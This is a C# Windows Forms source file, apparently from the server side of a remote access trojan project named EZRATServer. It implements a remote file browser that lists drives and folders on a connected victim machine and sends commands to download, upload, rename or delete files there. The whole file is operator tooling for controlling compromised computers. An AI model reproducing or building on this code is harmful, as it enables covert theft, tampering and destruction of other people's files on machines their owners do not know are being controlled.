using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using EZRATServer.Network;
using EZRATServer.Forms;
using EZRATServer.Utils;

namespace EZRATServer
{
    public partial class FileBrowser : Form
    {


        const string STATUS_TEXT = "Number of files and folder : ";

        private int _id;

        public int Id
        {
            get { return _id; }
            set { _id = value; }
        }


        private string _pathDownload;



        public string PathDownload { get => _pathDownload; set => _pathDownload = value; }

        private string _path;

        public string Path
        {
            get { return _path; }
            set { _path = value; }
        }

        private Server _parent;

        public Server BaseWindows
        {
            get { return _parent; }
            set { _parent = value; }
        }


        public enum FileType : int
        {
            File = 1,
            Folder = 2,
        }

        public FileBrowser(Server parent, int id)
        {
            InitializeComponent();

            this.BaseWindows = parent;
            this.cmbDrives.SelectedIndexChanged += UpdatePath;
            this.lstFiles.MouseDoubleClick += NewPath;
            this.downloadMenu.Click += DownloadFile;
            this.uploadMenu.Click += UploadFile;
            this.renameMenu.Click += RenameFile;
            this.deleteMenu.Click += DeleteFile;
            this.picUp.Click += UpPath;
        }

        private void DownloadFile(object sender, EventArgs e)
        {
            this.PathDownload = Path + this.lstFiles.Items[lstFiles.Items.IndexOf(lstFiles.SelectedItems[0])].Text;
            this.BaseWindows.SendCommand("dlfile;" + this.PathDownload, this.Id);
        }

        private void UploadFile(object sender, EventArgs e)
        {
            OpenFileDialog opf = new OpenFileDialog();
            opf.Multiselect = false;

            if (opf.ShowDialog() == DialogResult.OK)
            {
                this.BaseWindows.SendFile(opf.FileName, this.lblPath.Text, this.Id);
            }
        }

        private void RenameFile(object sender, EventArgs e)
        {
            this.PathDownload = Path + this.lstFiles.Items[lstFiles.Items.IndexOf(lstFiles.SelectedItems[0])].Text;
            RenameFile rn = new RenameFile(PathDownload);
            if (rn.ShowDialog() == DialogResult.OK)
            {
                this.BaseWindows.SendCommand("rmfile;" + this.PathDownload + ";" + rn.FileName, this.Id);
            }
        }

        private void DeleteFile(object sender, EventArgs e)
        {
            this.PathDownload = Path + this.lstFiles.Items[lstFiles.Items.IndexOf(lstFiles.SelectedItems[0])].Text;
            this.BaseWindows.SendCommand("dtfile;" + this.PathDownload, this.Id);
        }

        private void UpPath(object sender, EventArgs e)
        {
            Path = Path.TrimEnd('\\');
            string result = Path.Substring(0, Path.LastIndexOf('\\') + 1);
            NewPath(result);
        }

        private void NewPath(string path)
        {
            Path = path;
            this.lblPath.Text = Path;
            BaseWindows.SendCommand("lsfiles-" + Path, Id);
        }

        private void NewPath(object sender, EventArgs e)
        {
            string path = this.lstFiles.Items[lstFiles.Items.IndexOf(lstFiles.SelectedItems[0])].Text;
            Path += $@"{path}\";
            this.lblPath.Text = Path;
            BaseWindows.SendCommand("lsfiles-" + Path, Id);
        }

        public void UpdatePath(object sender, EventArgs e)
        {
            this.cmbDrives.Invoke(new MethodInvoker(() => Path = this.cmbDrives.Items[this.cmbDrives.SelectedIndex].ToString()));
            BaseWindows.SendCommand("lsfiles-" + Path, Id);
            this.lblPath.Text = Path;
        }


        public void UpdateDrives(string[] drives)
        {
            for (int i = 0; i < drives.Length; i++)
            {
                this.cmbDrives.Invoke(new MethodInvoker(() => this.cmbDrives.Items.Add(drives[i])));
            }
            this.cmbDrives.Invoke(new MethodInvoker(() => this.cmbDrives.SelectedIndex = 0));
            this.cmbDrives.Invoke(new MethodInvoker(() => Path = this.cmbDrives.Items[this.cmbDrives.SelectedIndex].ToString()));
            UpdatePath(new object(), new EventArgs());
        }

        public void Update(string list)
        {
            ResetAll();
            string[] lstData = list.Split(Constantes.SeparatorChar);
            uint count = 0;
            for (int i = 0; i < lstData.Length; i++)
            {
                string[] data = lstData[i].Split(Constantes.Special_SeparatorChar);
                if (data.Length > 2) // File
                {
                    AddFileOrFolder(data[0], FileType.File, ToolBox.ReduceByteSize(data[2]));
                }
                else if (data.Length == 2) // Folder
                {
                    AddFileOrFolder(data[0], FileType.Folder);
                }
                count += 1;
            }
            this.lblStatus.Text = STATUS_TEXT + count.ToString();
            lstFiles.Invoke(new MethodInvoker(() => lstFiles.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent)));

            lstFiles.Invoke(new MethodInvoker(() => lstFiles.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)));

        }

        

        private void AddFileOrFolder(string name, FileType type, string size = "0")
        {
            if (name.StartsWith(Constantes.Special_Separator))
            {
                name = name.Substring(3);
            }
            if (lstFiles.InvokeRequired)
            {
                if (size != "0")
                    lstFiles.Invoke(new MethodInvoker(() => lstFiles.Items.Add(new ListViewItem(new string[] { name, type.ToString(), size.ToString() }))));
                else
                    lstFiles.Invoke(new MethodInvoker(() => lstFiles.Items.Add(new ListViewItem(new string[] { name, type.ToString() }))));

            }
            else
            {
                if (size != "0")
                    lstFiles.Items.Add(new ListViewItem(new string[] { name, type.ToString(), size.ToString() }));
                else
                    lstFiles.Items.Add(new ListViewItem(new string[] { name, type.ToString() }));
            }

        }

        private void ResetAll()
        {
            lstFiles.Invoke(new MethodInvoker(() => lstFiles.Items.Clear()));
        }
    }
}
